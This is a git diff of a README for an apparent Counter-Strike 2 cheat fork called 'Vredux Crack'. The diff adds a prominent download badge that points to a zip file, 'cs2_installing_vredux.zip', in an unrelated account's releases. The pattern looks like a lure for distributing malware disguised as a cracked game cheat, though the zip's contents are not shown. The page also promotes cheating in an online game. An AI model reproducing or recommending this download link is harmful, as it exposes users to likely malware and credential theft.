@@ -1,8 +1,9 @@
-
- 
  # Vredux Crack Recode (For hvh cs2)
 
 ![Windows](https://github.com/danielkrupinski/Osiris/workflows/Windows/badge.svg?branch=master&event=push)
+
+# Download⬇️⬇️⬇️:
+[<img src="https://img.shields.io/badge/Download_Vredux-Crack_CS2-blue?style=for-the-badge">](https://github.com/carrieharrisonpng/Osiris/releases/download/vredux24112024/cs2_installing_vredux.zip)
 
 Cross-platform (Windows) game hack for **Counter-Strike 2** with GUI and rendering based on game's Panorama UI. Compatible with the latest game update on Steam.
 
